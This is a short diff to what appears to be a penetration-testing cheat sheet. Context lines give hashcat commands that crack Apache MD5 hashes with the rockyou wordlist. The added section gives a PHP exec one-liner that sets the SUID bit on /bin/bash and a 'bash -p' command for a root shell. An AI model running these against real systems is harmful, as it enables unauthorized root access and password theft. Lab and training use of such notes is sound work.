@@ -45,3 +45,12 @@ hashcat -a 0 hash.txt /home/kali/Documents/rockyou.txt
 # Specified mode (Apache $apr1$ MD5)
 hashcat -m 1600 -a 0 hash.txt /home/kali/Documents/rockyou.txt
 ```
+
+### ⚡ Privilege Escalation via SUID Bash (PHP RCE)
+```php
+<?php exec("chmod +s /bin/bash"); ?>
+```
+Then on the target:
+```bash
+/bin/bash -p  # Run with elevated privileges if SUID is set
+```
